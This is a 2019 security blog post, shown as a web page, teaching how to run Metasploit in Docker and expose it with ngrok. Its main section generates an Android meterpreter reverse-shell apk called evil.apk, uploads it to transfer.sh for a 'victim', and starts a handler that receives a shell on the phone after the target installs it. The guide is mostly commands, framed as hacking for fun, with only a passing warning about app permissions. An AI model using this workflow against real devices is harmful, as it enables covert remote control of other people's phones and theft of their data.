<!DOCTYPE html>
<html lang="en">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <script async src="/js/custom.js"></script>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
<meta name="generator" content="Hugo 0.57.2" />

    
    
    

<title>Ngrok your DockerSploit • Think
Love
Share</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Ngrok your DockerSploit"/>
<meta name="twitter:description" content="Tired of broken tools? You broke your system frequently by installing random sh*t? So do I! Let&#39;s see how to use docker, metasploit, ngrok and aliases in order to simplify your life and keep your system alive while hacking the planet!"/>

<meta property="og:title" content="Ngrok your DockerSploit" />
<meta property="og:description" content="Tired of broken tools? You broke your system frequently by installing random sh*t? So do I! Let&#39;s see how to use docker, metasploit, ngrok and aliases in order to simplify your life and keep your system alive while hacking the planet!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://thinkloveshare.com/hacking/ngrok_your_dockersploit/" />
<meta property="article:published_time" content="2019-12-15T00:00:00+00:00" />
<meta property="article:modified_time" content="2019-12-15T00:00:00+00:00" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">
<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
</head>


    <body >
        
<div class="sidebar">
  <div class="container sidebar-about ">
      <span class="site__title">
        <a href="https://thinkloveshare.com/">Think
Love
Share</a>
      </span>
          <a href="https://thinkloveshare.com/">
          
          
          
          <div class="author-image">
            <img src="https://thinkloveshare.com/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
      <p class="site__description">
        <a href="https://thinkloveshare.com/">
         InfoSec, Code, Thoughts &amp; Feels 
      </a>
      </p>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/hacking/">
						<span>Hacking</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/coding/">
						<span>Coding</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/the_rest/">
						<span>The Rest</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/travels/">
						<span>Travels</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/about/">
						<span>About</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://github.com/Laluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://gitlab.com/TheLaluka" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	
	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
	
	
  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
  
</section>

    </p>
    <p class="copyright">
      &copy; 2021 Laluka.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Ngrok your DockerSploit</h1>
    
    
<div class="post__meta">
    
      <i class="fas fa-calendar-alt"></i> Dec 15, 2019
    
    
    <i class="fas fa-clock"></i> 6 min read
    <i class="fas fa-globe"></i>
    
    Non traduit
    
    <br/> <i class="fas fa-heart"></i>Any typos? Any idea to suggest? Feedback appreciated!<i class="fas fa-heart"></i><br/>
</div>


  </header>
  <hr/>
  <div class="post">
    

<p>Hey, you! <br />
Aren’t you tired of always having broken tools relying on broken software?  <br />
Pissed off because you just broke your system (againnn&hellip;) trying to fix your previously broken tools and now everything’s fucked-up and you want to raise penguins out of the tech world? </p>

<p>Or even worse, you want a reverse shell but you’re :</p>

<ul>
<li>At your grandparents place and they lost the router password so you can’t expose ports</li>
<li>So broke that you can’t buy nor rent a virtual private server</li>
</ul>

<p>Well that’s oddly specific but you’re on the exact right place on earth (and on the web)! \o7 <br />
Today, I’ll teach you how to use docker, metasploit, ngrok and aliases in order to simplify your life while hacking the planet!</p>

<h2 id="step-1-install-and-setup-docker">Step 1 : Install and setup docker</h2>

<p>UPDATE : Let&rsquo;s give a big shout out to <a href="https://twitter.com/Creased_">@Creased_</a> that <a href="https://twitter.com/Creased_/status/1206556812541091840">tweeted me</a> about the new / current docker install process, the one I initially published was deprecated. Oopsy Daisy.. <code>:x</code></p>

<p>The install procedure is specified in the official doc, but&hellip; Gotta go faaaast (and self contained)!</p>

<pre><code class="language-bash"># If previously installed, clean up 
sudo apt-get remove docker docker-engine docker.io containerd runc

# Update and install
sudo apt-get update
sudo apt-get install -y apt-transport-https ca-certificates curl gnupg-agent software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo apt-key fingerprint 0EBFCD88
sudo add-apt-repository \
   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) stable&quot; # Hardcode disco if you're on ubuntu 19.XX
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io
sudo docker run hello-world

# OR

curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
</code></pre>

<p>You can always <em>start</em>, <em>stop</em>, or <em>enable</em> the docker services using systemctl.
Just check it&rsquo;s working as intended using the <em>status</em> command, and eventually <em>enable</em> it at reboot.</p>

<pre><code class="language-bash">sudo systemctl start docker
sudo systemctl status docker
sudo systemctl enable docker
</code></pre>

<p>If you’re not familiar AT ALL with docker, reading Richard’s introduction might be a good starting point : <a href="https://teuze.github.io/posts/docker/">https://teuze.github.io/posts/docker/</a></p>

<h2 id="step-2-install-and-setup-ngrok">Step 2 : Install and setup ngrok</h2>

<blockquote>
<p>Ngrok is a tool that can allow someone to expose ports to the internet without struggle.</p>
</blockquote>

<p>Ngrok folks have servers and custom DNS running and exposing IP addresses and ports for us. When the developer decides to expose a port, a connection is established with them and one of their subdomain:port is redirected to the open connection, thus exposing the local port.</p>

<p><img class="img_med" src="/hacking/ngrok_your_dockersploit/ngrok.png" alt="ngrok"></p>

<p>Create an account, sign-in and visit <a href="https://dashboard.ngrok.com/get-started">https://dashboard.ngrok.com/get-started</a> to get your auth token.
Then install and configure your local instance with :</p>

<pre><code class="language-bash">sudo snap install ngrok
ngrok authtoken &lt;REDACTED_TOKEN&gt;
</code></pre>

<p>Now let’s verify everything works by creating a tunnel, checking logs in the webUI and opening a tcp tunnel.</p>

<ul>
<li>Top right :

<ul>
<li>Ngrok status &amp; logs</li>
<li>google-chrome <a href="http://localhost:4040">http://localhost:4040</a></li>
</ul></li>
<li>Top left :

<ul>
<li>Ngrok tunnel</li>
<li>ngrok tcp 8888</li>
</ul></li>
<li>Bottom right :

<ul>
<li>netstat, listen, verbose (really useful to know when we receive a connection), port 8888 (default is tcp)</li>
<li>nc -lvp 8888</li>
</ul></li>
<li>Bottom left :

<ul>
<li>netcat, connect to the right ngrok subdomain and port</li>
<li>nc 0.tcp.ngrok.io 17064</li>
</ul></li>
</ul>

<p><img class="img_big" src="/hacking/ngrok_your_dockersploit/step_2_working_tunnel.png" alt="step_2_working_tunnel"></p>

<h2 id="step-3-define-your-aliases">Step 3 : Define your aliases</h2>

<p>Add the following aliases in <em>~/.zshrc</em>, or <em>~/.bashrc</em> if you’re more vanilla, then source your config and you’re good to go!</p>

<pre><code class="language-bash">cat &gt; ~/.zshrc &lt;&lt; EOF
alias metasploit8888='sudo docker run --rm -it -v /tmp/msf:/tmp/msf -p 8888:8888 -e MSF_UID=0 -e MSF_GID=0 metasploitframework/metasploit-framework:latest /bin/bash'
alias wipe_docker='sudo docker rm $(sudo docker ps -a -q) &amp;&amp; docker rmi $(sudo docker images -q)'

source ~/.zshrc
EOF
</code></pre>

<blockquote>
<p>Update one week later : <br />
Adding the flag <code>--network=host</code> allows you to run many dockers without specifying the published ports, without port (bind) conflicts, and that&rsquo;s one less ip to be confused with so that&rsquo;s what I use now ! =]</p>
</blockquote>

<p>Let’s spend some time explaining metasploit8888 alias.</p>

<ul>
<li><code>sudo</code> # we need to be root to interact with the docker socket</li>
<li><code>docker</code> # Interact with the socket using docker (captain obvious &lt;3)</li>
<li><code>run</code> # start a process in out container</li>
<li><code>--rm</code> # remove the container on exit (cleaner)</li>
<li><code>-it</code> # interactive allocate a pseudo tty</li>
<li><code>-v /tmp/msf:/tmp/msf</code> # Mount /tmp/msf from our host in the docker, useful - `to extract data</li>
<li><code>-p 8888:8888</code> # expose out docker port on the host itself</li>
<li><code>-e MSF_UID=0 -e MSF_GID=0</code> # metasploit specific environment variables (root user and group)</li>
<li><code>metasploitframework/metasploit-framework:latest</code>  # the image we’ll use, from the Docker Hub</li>
<li><code>/bin/bash</code> # Override the entry point (msfconsole) with bash, so we can also use msfvenom</li>
</ul>

<p>Image provider here : <a href="https://hub.docker.com/r/metasploitframework/metasploit-framework/">https://hub.docker.com/r/metasploitframework/metasploit-framework/</a></p>

<h2 id="step-4-hack-the-planet">Step 4 : Hack the planet!</h2>

<p>Still here? Nice! Here’s our roadmap :</p>

<ul>
<li>Generate a meterpreter payload (apk)</li>
<li>Expose the dockerToHost (docker -p) and HostToWorld (ngrok)</li>
<li>Get the meterpreter handler ready</li>
<li>Execute the payload</li>
<li>Profit???</li>
</ul>

<h3 id="step-4-1-create-the-tunnel-and-generate-our-payload">Step 4.1 : Create the tunnel and generate our payload</h3>

<p>In order to create the right payload, we need to know which port we’ll use, thus we start the tunnel first.</p>

<pre><code class="language-bash">ngrok tcp 8888
</code></pre>

<p>Then we list the payloads and use the one of our choice. It should depend on the situation, but we’re just having fun here so let’s go for something efficient and reliable : meterpreter (shell++), reverse (connects back to us), tcp (more reliable than udp but slower for big queries)</p>

<pre><code class="language-bash">./msfvenom --list payload | grep android
./msfvenom -p android/meterpreter_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=8888 &gt; /tmp/msf/evil.apk
</code></pre>

<p>And then we make our payload available to our victim, thanks to transfer.sh &hellip; :]</p>

<pre><code class="language-bash">curl --upload-file /tmp/msf/evil.apk https://transfer.sh/evil.apk
</code></pre>

<p><img class="img_big" src="/hacking/ngrok_your_dockersploit/step_4_1_gen_payload.png" alt="step_4_1_gen_payload"></p>

<h3 id="step-4-2-start-the-multi-handler">Step 4.2 : Start the multi/handler</h3>

<p>At any time in msfconsole, you can use the following commands to know what you’re dealing with :</p>

<pre><code class="language-bash">help
info
options
show + tab # exhaustive list of available assets
</code></pre>

<p>Let’s grab our container ip and configure the multi/handler that will receive our reverse meterpreter.</p>

<pre><code class="language-bash">./msfconsole -q
use exploit/multi/handler
set payload android/meterpreter_reverse_tcp
ip a | grep eth # Get the container local ip for LHOST
set LHOST 172.17.0.2
set LPORT 8888
exploit
</code></pre>

<p><img class="img_big" src="/hacking/ngrok_your_dockersploit/step_4_2_multi_handler.png" alt="step_4_2_multi_handler"></p>

<h3 id="step-4-3-execute-the-payload-enjoy-the-meterpreter">Step 4.3 : Execute the payload, enjoy the meterpreter</h3>

<p>Our target will somehow install the apk on his / her phone, and then&hellip; KABOOM! </p>

<p>The app is installed and started, we receive our reverse meterpreter and can now have fun with it! <br />
Small demo here, getting system info, sending a message to myself and popping a shell :)</p>

<p><img class="img_big" src="/hacking/ngrok_your_dockersploit/step_4_3_profit.png" alt="step_4_3_profit"></p>

<p>Pay attention to all the permissions required, if you see that, some day, from any app : flee you fool!</p>

<p><img class="img_big" src="/hacking/ngrok_your_dockersploit/phone.png" alt="phone"></p>

<h2 id="step-5-that-s-all-folks">Step 5 : That’s all folks!</h2>

<p>From now on, when you’ll have a new tool to try or dirty tricks to test, browse the world wild (no typo here) web and find dockers! That being said, please be extra careful with the parameters you use with docker, it’s still possible to wreck your system in many ways!</p>

<p>I initially wanted to enumerate a few common docker pitfalls, but there are just so many of them that I’ll just give pointers to more complete resources :</p>

<ul>
<li><a href="https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/">Root via docker spawning</a></li>
<li><a href="https://snyk.io/blog/a-serious-security-flaw-in-runc-can-result-in-root-privilege-escalation-in-docker-and-kubernetes/">Vulnerability in runC</a></li>
<li><a href="https://fosterelli.co/privilege-escalation-via-docker">Docker group abuse</a></li>
<li><a href="https://www.secjuice.com/how-to-harden-docker-containers/">Good practices</a></li>
<li><a href="https://pythonspeed.com/docker/">Hardening and optimisations</a></li>
</ul>

<p>I hope that you liked this workflow and learned something, and hopefully now you’ll spend less time fixing your system and more time hacking the world!</p>

  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/hacking/grehack_2018/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">GreHack 2018</span>
    </a>
    
    
    <a href="/hacking/wordpress_subpath_auditor/" class="post--navigation-next">
      <span class="navigation-tittle">Wordpress Subpath Auditor</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-128985075-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>



    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
